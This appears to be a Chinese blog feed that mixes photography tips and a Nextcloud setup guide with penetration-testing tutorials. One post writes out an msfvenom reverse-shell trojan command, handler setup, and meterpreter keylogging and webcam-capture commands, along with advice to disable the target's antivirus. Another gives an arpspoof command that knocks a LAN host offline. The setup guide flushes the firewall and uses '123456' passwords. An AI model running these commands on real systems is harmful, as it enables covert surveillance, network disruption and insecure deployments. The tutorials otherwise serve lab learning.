油画作品，有助于培养视觉的构图能力。如何突出拍摄主体呢?三分法则是传统艺术家的构图宝典，它可能已经流传了数百年。在你拍照时应该熟练掌握这个技法，用横竖各两根直线平均将画面分成九个格，直线交汇的各点就是最能吸引人目光的地方。只要将拍摄主体或画面中的最重要元素放在其中任一点附近，观赏者的目光必然会注意这个主体，照片的构图也就会在视觉上显得和谐。有一些数码相机的取景器中甚至直接就有这些辅助构图的线条。当然还有许多其它办法来突出主体，只要你用心尝试，一定会发现许多经验。</p><h2 id="六、拍出层次感"><a href="#六、拍出层次感" class="headerlink" title="六、拍出层次感"></a>六、拍出层次感</h2><p>如何在技术上判断一张风光照片的好坏，有一个基本的要素就是看照片的层次感。有了层次感，也就有了立体感，画面也会显得丰满，意境也会深刻。要使风光照片获得丰富的层次感，就应该处理好前景、中景和背景的关系，让三者之间能够平衡分布，互相呼应;在大小与明暗对比上，能够自然和谐。风光照片最忌讳：见什么拍什么，而不去考虑前景的搭配与背景的衬托。你应该有意在画面上加一些前景或背景，以衬托主体。用好镜头是获得层次感的关键，广角与长焦的不同透视效果可以帮助你分布画面中不同景物的层次关系。</p><h1 id="七、加上人会更有意味"><a href="#七、加上人会更有意味" class="headerlink" title="七、加上人会更有意味"></a>七、加上人会更有意味</h1><p>不要忘了人!有人的风光照会更富有生气，更有意味。很多人都会感觉自己拍摄的照片太平淡，没有生气，除了色彩就是构图。为什么不想办法让风光照片中有个人呢?人也是大自然的组成部分，有了人的风光照片就有了 性，它会让画面带上浪漫的气息，富有诗意。这个人物不必做主体，他是配角，可以是虚的，也可以很小，但是必须能够增强画面的感染力。人与景的情景交融，是一张风光照片的最高境界。</p><h2 id="八、随时记下拍摄的地名"><a href="#八、随时记下拍摄的地名" class="headerlink" title="八、随时记下拍摄的地名"></a>八、随时记下拍摄的地名</h2><p>许多刚学摄影的人都没有这个习惯，认为拍完一张风光照片就以为一切完事了，其实发表照片时经常需要为这个照片取个题目，这时候你才想起来不知道这个拍摄的地点叫什么，所以记住拍摄的地名也很重要。特别是一些照片要去投稿，必须有题目。另外，你记住这张照片的地名，也有助于你第二次去重复拍摄。其实很多成功的风光照片，都是摄影师在同一个地点拍了无数次，才得到的好照片。<br>categories: 摄影</p><hr>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit渗透测试和信息收集</title>
      <link href="/2020/08/01/5/"/>
      <url>/2020/08/01/5/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP协议收集主机信息"><a href="#TCP协议收集主机信息" class="headerlink" title="TCP协议收集主机信息"></a>TCP协议收集主机信息</h2><p>1<br>（1）    Metasploit框架：Metasploit框架包含了世界上最大而且经过测试攻击的代码数据库。该框架也是迄今为止使用Ruby脚本语言构建的最复杂项目之一。</p><p>（2）漏洞：系统中存在的可能被攻击者或者渗透测试人员用以破坏系统安全性的弱点。漏洞可能存在于操作系统中，应用软件甚至是网络协议中。</p><p>（3）漏洞利用代码：是攻击者或测试人员针对系统中的漏洞设计的，用以破坏安全性的攻击代码。</p><p>（4）攻击载荷：完成实际攻击功能的代码，在成功渗透漏洞后会在系统运行。攻击载荷最常见的用途是在攻击者和目标机器之间建立一个连接。</p><p>（5）模块：是组成完整系统的基本构建块。每个模块执行某种特定的任务，将若干模块组合成单独的功能主题可构成一个完整的系统。这种体系结构最大的优势在于开发人员可以很容易的将新的漏洞利用代码和工具整合到Metasploit框架中。</p><p>（6）库：Metasploit使用不同的库，这些库是保证 Metasploit框架正确运转的关键。库实际上是预定义的任务、操作和功能的组合。框架中不同的模块都可以使用这些库完成相应功能。</p><p>（7）用户接口：Metasploit提供了4种用户接口，分别是msfconsole，msfcli，msfgui以及msfweb。msfconsole对Metasploit框架提供最好的支持，对框架所有功能的发挥起杠杆作用。</p><p>SSL：传统的网络服务程如FTP，tellnet在本质上都是不安全的，因为他们在网络中传输的都是用明文传输的，攻击者就可以截取数据而且这些服务进程都很容易遭受“中间人”攻击。在这种情况下，SSL出现了，通过SSL可以将传输的数据进行加密，这样“中间人”攻击就不能实现了，也可以防止DNS和IP欺骗。另外传输的数据是经过压缩的，因此传输的数据会加快。<br>2<br>TCP/IP(TransmissionControl Protocol/Internet Protocol) 即传输控制协议/网间协议，是一种面向连接（连接导向）的、可靠的、基于字节流的运输层（Transportlayer）通信协议，由IETF的RFC 793说明（specified）。在简化的计算机网络OSI模型中，它完成第四层传输层所指定的功能，UDP是同一层内另一个重要的传输协议。<br>3<br>SNMP(Simple Network Management Protocol,简单网络管理协议)的前身是简单网关监控协议(SGMP)，用来对通信线路进行管理。随后，人们对SGMP进行了很大的修改，特别是加入了符合Internet定义的SMI和MIB：体系结构，改进后的协议就是著名的SNMP。SNMP的目标是管理互联网Internet上众多厂家生产的软硬件平台，因此SNMP受Internet标准网络管理框架的影响也很大。现在SNMP已经出到第三个版本的协议，其功能较以前已经大大地加强和改进了。<br>4<br>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。SMB使用了NetBIOS的应用程序接口（Application ProgramInterface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System）。<br>5<br>SSH 为Secure Shell的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、DigitalUNIX、Irix，以及其他平台，都可运行SSH。<br>6<br>FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端。其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。在开发网站的时候，通常利用FTP协议把网页或程序传到Web服务器上。此外，由于FTP传输效率非常高，在网络上传输大的文件时，一般也采用该协议。 默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但是，是否使用20作为传输数据的端口与FTP使用的传输模式有关，如果采用主动模式，那么数据传输端口就是20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p><hr><h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p><img src="https://pic.downk.cc/item/5eb82251c2a9a83be5448bb9.png" alt=""></p><h2 id="ARP扫描模块"><a href="#ARP扫描模块" class="headerlink" title="ARP扫描模块"></a>ARP扫描模块</h2><p><img src="https://pic.downk.cc/item/5eb82b31c2a9a83be5601985.png" alt=""></p><h2 id="载入模块"><a href="#载入模块" class="headerlink" title="载入模块"></a>载入模块</h2><p><img src="https://pic.downk.cc/item/5eb82251c2a9a83be5448bc1.png" alt=""></p><h2 id="查看配置参数"><a href="#查看配置参数" class="headerlink" title="查看配置参数"></a>查看配置参数</h2><p><img src="https://pic.downk.cc/item/5eb82251c2a9a83be5448bc8.png" alt=""></p><h2 id="配置扫描的目标网络和线程"><a href="#配置扫描的目标网络和线程" class="headerlink" title="配置扫描的目标网络和线程"></a>配置扫描的目标网络和线程</h2><p><img src="https://pic.downk.cc/item/5eb82251c2a9a83be5448bcb.png" alt=""></p><h2 id="扫描网段里的机器"><a href="#扫描网段里的机器" class="headerlink" title="扫描网段里的机器"></a>扫描网段里的机器</h2><p><img src="https://pic.downk.cc/item/5eb8225bc2a9a83be544a393.png" alt=""></p><h2 id="退出模块"><a href="#退出模块" class="headerlink" title="退出模块"></a>退出模块</h2><p><img src="https://pic.downk.cc/item/5eb8225bc2a9a83be544a399.png" alt=""></p><h2 id="用半连接方式扫描TCP端口"><a href="#用半连接方式扫描TCP端口" class="headerlink" title="用半连接方式扫描TCP端口"></a>用半连接方式扫描TCP端口</h2><p><img src="https://pic.downk.cc/item/5eb8225bc2a9a83be544a39b.png" alt=""></p><h2 id="选择模块和查看配置"><a href="#选择模块和查看配置" class="headerlink" title="选择模块和查看配置"></a>选择模块和查看配置</h2><p><img src="https://pic.downk.cc/item/5eb8225bc2a9a83be544a3a0.png" alt=""></p><h2 id="设置目标主机IP和端口和线程"><a href="#设置目标主机IP和端口和线程" class="headerlink" title="设置目标主机IP和端口和线程"></a>设置目标主机IP和端口和线程</h2><p><img src="https://pic.downk.cc/item/5eb82264c2a9a83be544bb08.png" alt=""></p><h2 id="开始扫描并嗅探密码和用户名"><a href="#开始扫描并嗅探密码和用户名" class="headerlink" title="开始扫描并嗅探密码和用户名"></a>开始扫描并嗅探密码和用户名</h2><p><img src="https://pic.downk.cc/item/5eb82264c2a9a83be544bb0f.png" alt=""></p><h2 id="载入模块-1"><a href="#载入模块-1" class="headerlink" title="载入模块"></a>载入模块</h2><p><img src="https://pic.downk.cc/item/5eb82264c2a9a83be544bb12.png" alt=""></p><h2 id="查看模块作用"><a href="#查看模块作用" class="headerlink" title="查看模块作用"></a>查看模块作用</h2><p><img src="https://pic.downk.cc/item/5eb82264c2a9a83be544bb16.png" alt=""></p><h2 id="开始嗅探并安装lftp"><a href="#开始嗅探并安装lftp" class="headerlink" title="开始嗅探并安装lftp"></a>开始嗅探并安装lftp</h2><p><img src="https://pic.downk.cc/item/5eb82264c2a9a83be544bb21.png" alt=""></p><h2 id="嗅探密码成功"><a href="#嗅探密码成功" class="headerlink" title="嗅探密码成功"></a>嗅探密码成功</h2><p><img src="https://pic.downk.cc/item/5eb82267c2a9a83be544c451.png" alt=""></p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建自己的私有云盘</title>
      <link href="/2020/07/01/4/"/>
      <url>/2020/07/01/4/</url>
      
        <content type="html"><![CDATA[<p>使用的系统是Linux Centos7.6<br>1、搭建LAMP网站架构<br>2、升级PHP5.4到PHP5.6<br>3、安装PHP扩展模块<br>4、实战1：使用Nextcloud建立属于自己私有的云存储网盘（百度网盘）<br>5、实战2：实现加密对外分享文件和在线播放小电影： 桃谷.avi  </p><hr><h2 id="Nextcloud概述："><a href="#Nextcloud概述：" class="headerlink" title="Nextcloud概述："></a>Nextcloud概述：</h2><p>Nextcloud 一款文件主机服务软件，就是我们平时使用的云存储，不过这是在自己主机的服务器上建立属于自己的私有云，Nextcloud　使用AGPLv3协议发布。本项目是基于PHP和SQLite，MySQL，Oracle或PostgreSQL数据库，所以它可以运行在所有的平台上<br>nextcloud 是一个开源免费专业的私有云存储项目，它能帮你快速在个人电脑或服务器上架设一套专属的私有云文件同步网盘，可以像 百度云那样实现文件跨平台同步、共享、版本控制、团队协作等等。nextcloud 能让你将所有的文件掌握在自己的手中，只要你的设备性能和空间充足，那么用起来几乎没有任何限制。<br>nextcloud 跨平台支持 Windows、Mac、Android、iOS、Linux 等平台，而且还提供了网页版和 WebDAV 形式访问，因此你可以在任何电脑、手机上都能轻松获取你的文件了。</p><hr><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><h2 id="1、需要LAMP架构"><a href="#1、需要LAMP架构" class="headerlink" title="1、需要LAMP架构"></a>1、需要LAMP架构</h2><pre><code>  yum install  -y  httpd php php-mysql mariadb-server mariadb sqlite php-dom php-mbstring php-gd php-pdo</code></pre><hr><p>注：<br>httpd   #apache web 服务器<br>php  #php<br>mariadb-server mariadb   # 从centos  7开始，系统中自带的mysql数据库，更名为 mariadb-server  。<br>PDO（PHP数据对象） 是一个轻量级的、具有兼容接口的PHP数据连接拓展</p><hr><h2 id="2、开LAMP相关服务"><a href="#2、开LAMP相关服务" class="headerlink" title="2、开LAMP相关服务"></a>2、开LAMP相关服务</h2><pre><code> systemctl start httpd.service   systemctl start mariadb.service</code></pre><hr><h2 id="3、关闭防火墙-和selinux"><a href="#3、关闭防火墙-和selinux" class="headerlink" title="3、关闭防火墙 和selinux"></a>3、关闭防火墙 和selinux</h2><pre><code> getenforce Disabled iptables -F</code></pre><hr><p>4、在搭建好的LAMP环境上部署 nextcloud 站点<br>下载解压源码包，并移动到网站根目录下<br>通过xshell中的rz上传nextcloud-10.0.1.zip 到linux系统中：</p><hr><pre><code> unzip nextcloud-10.0.1.zip cp -r nextcloud/*   /var/www/html/ chown -R apache.apache /var/www/html/</code></pre><hr><p>5、在MariaDB数据库中创建nextcloud的数据库：<br>设置mysql的root密码：</p><hr><pre><code> mysqladmin -u root password &quot;123456&quot; mysql -u root -p123456 MariaDB [(none)]&gt; create database nextcloud;    #创建nextcloud数据库: exit</code></pre><hr><h1 id="三、通过web界面安装nextcloud"><a href="#三、通过web界面安装nextcloud" class="headerlink" title="三、通过web界面安装nextcloud"></a>三、通过web界面安装nextcloud</h1><hr><pre><code> http://192.168.x.xx/index.php</code></pre><hr><p>但是网页提示当前php版本是5.4，要求高于7.0，所以要更新php版本</p><h2 id="更新php"><a href="#更新php" class="headerlink" title="更新php"></a>更新php</h2><p>更新源</p><hr><pre><code>rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm   rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><p>移除系统自带的php-common</p><hr><pre><code>yum remove php-common -y</code></pre><p>安装依赖包</p><hr><pre><code>yum install -y php72w php72w-opcache php72w-xml php72w-mcrypt php72w-gd php72w-devel php72w-mysql php72w-intl php72w-mbstringphp -v #查看版本 systemctl restart httpd #重启apache  让php5.6 的配置文件生效</code></pre><hr><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展:"></a>扩展:</h2><p>SQLite数据库概述：<br>SQLite是一款轻型的数据库，是遵守ACID的关系型数据库管理系统，它包含在一个相对小的C库中。它是D.RichardHipp建立的公有领域项目。它的设计目标是嵌入式的，而且目前已经在很多嵌入式产品中使用了它，它占用资源非常的低，在嵌入式设备中，可能只需要几百K的内存就够了。</p><hr><pre><code> 用户名： admin   密码： 123456 接下来输入数据库的用户： root  密码： 123456 数据库名： nextcloud</code></pre><hr><h2 id="接下来自动化安装"><a href="#接下来自动化安装" class="headerlink" title="接下来自动化安装"></a>接下来自动化安装</h2><p>安装完后，使用admin  密码： 123456  登录系统<br>安装好之后<br>在web版本上上传文档<br>上传视频，实现在播放<br>分享我的文档<br>输入正确的密码就可以了<br>在线播放或下载都可以 </p><hr><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>比如files相关的<br>加载插件右击选项<br>可以进行相应的操作，更多插件可以去发现哟。。。。。！</p><hr><p>搭建所需<a href="https://wws.lanzous.com/b01tw6ofi" target="_blank" rel="noopener">资料</a> 密码:f7cw</p>]]></content>
      
      
      <categories>
          
          <category> 搭建环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建环境 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali渗透Windows</title>
      <link href="/2020/06/01/3/"/>
      <url>/2020/06/01/3/</url>
      
        <content type="html"><![CDATA[<h2 id="先查看自己的IP地址"><a href="#先查看自己的IP地址" class="headerlink" title="先查看自己的IP地址"></a>先查看自己的IP地址</h2><pre><code>ifconfig</code></pre><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><pre><code>sudo msfvenom -p Windows/meterpreter/reverse_tcp lhost=192.168.23.130 lport=8888 -f exe -a x86 &gt;giao .exe</code></pre><p>把木马放到目标机上(一台Windows)</p><h2 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h2><pre><code>msfconsole|msfdb run</code></pre><h2 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h2><pre><code>use exploit/multi/handler</code></pre><h2 id="设置监听IP"><a href="#设置监听IP" class="headerlink" title="设置监听IP"></a>设置监听IP</h2><pre><code>set lhost 192.168.23.130</code></pre><h2 id="设置端口"><a href="#设置端口" class="headerlink" title="设置端口"></a>设置端口</h2><pre><code>set lport 8888（随便）</code></pre><h2 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h2><pre><code>exploit</code></pre><p>然后到目标机运行木马(双击)<br>监听成功之后，要获取权限</p><hr><pre><code>getsystem——获取管理员权限ls——获取当前目录文件screenshot——获取屏幕截图shell——控制权限(乱码输入chcp 65001 )</code></pre><p>拿权之后可以随意删除与修改内容，没拿全只能获取内容</p><pre><code>echo&quot;我是控制你电脑的人&quot;&gt;ss.txt——创建文件输出内容 创建文件txtps——正在运行的软件列表</code></pre><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><pre><code>keyscan_start——捕获输入记录keyscan_dump——存储输入记录keyscan_stop——停止键盘操作run vnc——实时监控屏幕webcam_snap——拍摄照片</code></pre><p> 注: 记得在靶机上退出杀毒软件，否则会被检测到并删除。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP攻击之Kali Linux局域网断网攻击</title>
      <link href="/2020/05/06/1/"/>
      <url>/2020/05/06/1/</url>
      
        <content type="html"><![CDATA[<h2 id="ARP攻击之Kali-Linux局域网断网攻击"><a href="#ARP攻击之Kali-Linux局域网断网攻击" class="headerlink" title="ARP攻击之Kali Linux局域网断网攻击"></a>ARP攻击之Kali Linux局域网断网攻击</h2><p>特别声明：<br>我们学习研究网络安全技术的目的应是为了维护网络世界的安全，保护自己和他人的私有信息不被非法窃取和传播。请您遵守您所在地的法律，请勿利用本文所介绍的相关技术做背离道德或者违反法律的事情。</p><p>Special statement:<br>The purpose of our study of cyber security technology should be to maintain the security of the cyber world and protect the private information of ourselves and others from being illegally stolen and disseminated. Please comply with your local laws. Do not take advantage of the relevant technology introduced in this article to do anything that deviates from morality or against the law.</p><hr><p>在这里，作为攻击者的计算机使用的是安装在VMware Workstation中的Kali Linux，我们需要在虚拟机的设置中将Kali的联网方式改成“桥接模式”，并且不要勾选“复制物理网络连接状态”。</p><hr><h2 id="获取目标主机IP"><a href="#获取目标主机IP" class="headerlink" title="获取目标主机IP"></a>获取目标主机IP</h2><p>在这里，我们使用Ettercap对内网进行扫描以获取目标主机IP和网关的信息。输入命令:</p><pre><code>ettercap -G #打开Ettercap的GUI界面</code></pre><p>依次点击“Sniff(嗅探) -&gt; Unified sniffing(统一嗅探)”，之后弹出如下界面让选择进行扫描的网络接口（Network interface）这里我们使用默认的eth0端口。点击“OK”。之后依次点击“Hosts(主机) -&gt; Scan for hosts(扫描主机)”。<br>这时会出现一个进度条，等待进度条结束，依次点击“Hosts -&gt; Hosts list(主机列表)”即可显示本机所在局域网中除本机之外，当前已连接至网络的设备的IP地址和MAC地址。</p><hr><h2 id="对局域网内的目标主机实施断网攻击"><a href="#对局域网内的目标主机实施断网攻击" class="headerlink" title="对局域网内的目标主机实施断网攻击"></a>对局域网内的目标主机实施断网攻击</h2><p>我们使用Kali Linux中的Arpspoof进行ARP攻击。</p><p>在实施断网攻击前，我们先测试一下目标主机192.168.50.130是不是能上网，输入命令：</p><pre><code> ping www.baidu.com</code></pre><p>发现可以Ping通，说明目标主机在攻击开始之前是可以上网的。</p><p>在我们的攻击机上，即Kali中，输入命令：</p><pre><code> arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host e.g: arpspoof -i eth0 -t 192.168.50.130 192.168.50.1</code></pre><p>回车就开始对目标主机进行断网攻击了，此时我们在目标主机上执行命令：</p><pre><code> ping www.baidu.com</code></pre><p>就会返回一个错误提示：“Ping请求找不到主机<a href="http://www.baidu.com”。" target="_blank" rel="noopener">www.baidu.com”。</a></p><p>通过上述命令产生的Arpspoof的攻击进程不会自动停止，除非当前攻击链路被中断，如攻击机关机或者断开与当前局域网的连接，或目标机关机或者断开与当前局域网的连接或者更改了其在当前局域网内的IP地址。我们可以在Arpspoof进程所在终端上使用“Ctrl+Z”手动关闭Arpspoof的攻击进程。</p><p>关闭Arpspoof的攻击进程后，之前被攻击的目标主机一般会在几秒钟的时间内自动恢复正常的网络连接。</p><hr><h2 id="Ettercap0-8-2的帮助信息（命令ettercap-help）："><a href="#Ettercap0-8-2的帮助信息（命令ettercap-help）：" class="headerlink" title="Ettercap0.8.2的帮助信息（命令ettercap -help）："></a>Ettercap0.8.2的帮助信息（命令ettercap -help）：</h2><hr><pre><code> ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team Usage: ettercap [OPTIONS] [TARGET1] [TARGET2] TARGET is in the format MAC/IP/IPv6/PORTs (see the man for further detail) Sniffing and Attack options:-M, --mitm &lt;METHOD:ARGS&gt;    perform a mitm attack -o, --only-mitm             don&#39;t sniff, only perform the mitm attack-b, --broadcast             sniff packets destined to broadcast-B, --bridge &lt;IFACE&gt;        use bridged sniff (needs 2 ifaces)-p, --nopromisc             do not put the iface in promisc mode-S, --nosslmitm             do not forge SSL certificates-u, --unoffensive           do not forward packets-r, --read &lt;file&gt;           read data from pcapfile &lt;file&gt;-f, --pcapfilter &lt;string&gt;   set the pcap filter &lt;string&gt;-R, --reversed              use reversed TARGET matching-t, --proto &lt;proto&gt;         sniff only this proto (default is all)  --certificate &lt;file&gt;    certificate file to use for SSL MiTM  --private-key &lt;file&gt;    private key file to use for SSL MiTMUser Interface Type:-T, --text                  use text only GUI   -q, --quiet                 do not display packet contents   -s, --script &lt;CMD&gt;          issue these commands to the GUI-C, --curses                use curses GUI-D, --daemon                daemonize ettercap (no GUI)-G, --gtk                   use GTK+ GUILogging options:-w, --write &lt;file&gt;          write sniffed data to pcapfile &lt;file&gt;-L, --log &lt;logfile&gt;         log all the traffic to this &lt;logfile&gt;-l, --log-info &lt;logfile&gt;    log only passive infos to this &lt;logfile&gt;-m, --log-msg &lt;logfile&gt;     log all the messages to this &lt;logfile&gt;-c, --compress              use gzip compression on log filesVisualization options:-d, --dns                   resolves ip addresses into hostnames-V, --visual &lt;format&gt;       set the visualization format-e, --regex &lt;regex&gt;         visualize only packets matching this regex-E, --ext-headers           print extended header for every pck-Q, --superquiet            do not display user and passwordLUA options:  --lua-script &lt;script1&gt;,[&lt;script2&gt;,...]     comma-separted list of LUA scripts  --lua-args n1=v1,[n2=v2,...]               comma-separated arguments to LUA script(s)General options:-i, --iface &lt;iface&gt;         use this network interface-I, --liface                show all the network interfaces-Y, --secondary &lt;ifaces&gt;    list of secondary network interfaces-n, --netmask &lt;netmask&gt;     force this &lt;netmask&gt; on iface-A, --address &lt;address&gt;     force this local &lt;address&gt; on iface-P, --plugin &lt;plugin&gt;       launch this &lt;plugin&gt;-F, --filter &lt;file&gt;         load the filter &lt;file&gt; (content filter)-z, --silent                do not perform the initial ARP scan-6, --ip6scan               send ICMPv6 probes to discover IPv6 nodes on the link-j, --load-hosts &lt;file&gt;     load the hosts list from &lt;file&gt;-k, --save-hosts &lt;file&gt;     save the hosts list to &lt;file&gt;-W, --wifi-key &lt;wkey&gt;       use this key to decrypt wifi packets (wep or wpa)-a, --config &lt;config&gt;       use the alterative config file &lt;config&gt;Standard options:-v, --version               prints the version and exit-h, --help                  this help screen</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>空银河与星轨的拍摄技巧</title>
      <link href="/2020/04/04/2/"/>
      <url>/2020/04/04/2/</url>
      
        <content type="html"><![CDATA[<p>恼人的冬天过去，春、夏、秋这三个季上高山拍照，气温便不再那么「冻人」。这时除了晨<br>曦摄影之外，高山上的星空、银河与车轨也是抢手的风景摄影题材之一。这一篇我们就用简<br>单的文字与说法，带大家进入浩瀚的星空夜里。<br>浩瀚的星空、一望无际的星空银河、星轨以及车轨，都是夜里拍摄的好题材。银河像一条河<br>流，穿越星空在天上闪闪发光。就以台湾所在的北半球来说，夏季夜里的银河最为明显，冬<br>季最黯淡。秋末的此时，夕日将尽以后，就可以看到带状的星待由南往北延伸。<br>三至七月的最佳银河时间<br>整体而言！秋末冬初银河在日落后看向西南方即可看见，在春天三月底的子夜1：30由靠<br>近东方升起，四月底约在23：00升起，五月底21：30升起，六月底由19：30升起。七<br>月才在接近子夜0：00落入地平线，8、9、10月底每个月分提早2小时结束。也就是说10<br>月份底落日后的东南方，即可见到将要落下的银河。<br>10月底，拍摄完夕阳，走在主峰步道往南方向即可见银河如缎带般垂直高挂。<br>夜里的银河在夜空里移动，令人感叹宇宙的浩瀚与人类的渺小。<br>星轨作品最适合的拍摄时机？<br>星轨作品最适合的拍摄时机是在半月以后，月出前的2个小时，或是月没前的半个小时。<br>这2个时间点的好处为何？月出前的2个小时开始拍摄，可以利用月光还未出现以前，尽<br>情地捕捉1个多小时的星轨，然后利用月缺的月光出来后，适当的帮地景补光，再收取快<br>门。而月缺的月没前半个小时开始拍摄，则是利用月光先补地景，然后再月落以后得以延长<br>星轨拍摄时间。<br>##拍摄银河小技巧<br>拍摄银河的方法极为简单，在15-30秒内曝光完成是极为重要的重点，因为过久的时间星<br>体移动，点点繁星容易变成条状星轨，所以建议用2.8以上的大光圈，加上极高的ISO<br>（3200-6400），再以15-30秒左右曝光即可。<br>合欢山上因为光害很少，所以各处都可以看到满天星斗，一般而言，月圆前后的2周日子，<br>月光较强，比较适合拍摄夜景，月缺的日子较适合拍摄星空银河与星轨哦。<br>满月时的山谷，宛如白昼满月或是月光较强的夜里，地景就容易完整呈现，所以极适合夜景的拍摄，藉由月光的辅助<br>下，经过长时间曝光后有如白昼。其实！这样的日子也可以用数位合成的方式来合成星轨，<br>唯一的缺点是因为月光较强，相对的天上的星星数量会变少，星轨数量也减少。<br>月光下，栏杆拖曳着长影，长时间曝光的夜景照片恍如白昼，要不是星迹与车迹，很难想<br>像这是夜里。拍摄星轨的准备工具与拍摄步骤由于拍摄星轨需要以长时间曝光，让天上微弱的点点星光，得以留存在影像中。因此，固定<br>相机的脚架，以及电子快门线，绝对是不可或缺的拍摄利器！（为了避免快门启动时，反光<br>镜的震动造成影像晃动，建议先进入相机选单中，将反光镜预锁启动哦！）</p><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>对焦：请先把镜头切到手动对焦MF，如果环境昏暗不好对焦​<br>，可以先把相机<br>的对焦点对准「远方」的灯光或是天空的月亮进行对焦。如果镜头上有表尺，那先切到MF，<br>然后看着镜头表尺，把镜头焦聚转到「无限远符号∞」，其实就把焦点转到镜头的无限远（泛<br>焦）处。</p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>测光：先用大光圈与高ISO拍摄测光用照片，拍摄完成后，检查直方图的最左侧是<br>否呈现最高峰并贴近边缘。如果是就代表，画面里有太多黑色无法辨识的景物，拍摄测光用<br>照片时建议再加上EV值（提高更高的ISO或是延长拍摄时间），直到直方图的最左侧出<br>现差异距离，而且最右侧无过曝的峰值，就可以利用该曝光值，作为换算为长时间曝光参数。<br>以这个拍摄经验里，在自然无光害的高山上夜曝，通常可以加上1-2的曝光补偿，尤其月缺<br>或是无月光的环境，使用AV（光圈先决）拍照，正常的曝光几乎都要加到2或3以上，如<br>此可以获得更细致的暗部细节。</p><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>换算曝光时间拍摄星轨：举例来说，先利用光圈2.8与ISO3200而快门时间暂时设<br>为30秒拍摄星空影像。然后检视曝光值是否符合您的需要。如果照片过暗，就再开高ISO<br>或是延长快门时间，直到照片符合您需要的曝光值。如果光圈2.8、ISO3200、快门时间<br>60秒所拍摄的影像亮度符合您的需要，那就可以换算拍摄星轨所需的长时曝光。</p><h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p>于是我们预设把ISO降到200，光圈5.6来拍摄星轨，那所需的曝光时间如下：<br>先算出ISO的完整级距：3200→1600→800→400→200，3200到200其间相差4<br>级，所以快门时间可以延长到60→120→240→480→960秒=16分钟。<br>光圈的完整级距：2.8→4→5.6其间相差2级，所以快门时间由16分→32分→64分，<br>然后换算时间得到64分，那就可以拍出1小时的星轨照片。<br>拍摄方位的差别<br>当拍摄方向正北时北，拍出的是圆形星轨，而面向东西时，所拍出的是类似流星雨般的条状<br>星轨。<br>##拍摄心目中的星轨，不一定得遵照摄影时节表或许有人会觉得夏季比​较适合拍摄星轨作品？实际上，摄影是一种遇见，不一定得套用<br>百分百的思维。如何解释呢？如果拍摄的重点是银河，那当然属夏季到初秋最为适合。但是<br>星空轮转或是类似流星雨的条状星轨作品，其实只要天气状况许可（天光无云、无光害），<br>巧妙的选择题材，适当的构思再透过曝光的技巧，任何季节都可以拍摄星轨作品。<br>满月与月缺，或是无月光的环境，该如何拍摄？<br>有月光的日子，环境容易有细节，但是星空的星星相对较少，而且所需曝光时间较短，星轨<br>数量相对减少与变短。没有月光的日子，天空星星较多，但是暗部容易出现躁讯与较少细节。<br>当月光较强时，可以利用拍摄同角度的连续多张作品，甚至利用高ISO与较短的曝光时间，<br>先拍出点点繁星，再利用电脑的星轨叠图软体，制作星轨连接或是动画甚至缩时影像。（或<br>是担心像电力不足无法1~2小时常时曝光，利用此方法也可以保全拍摄照片，只有最后一<br>张相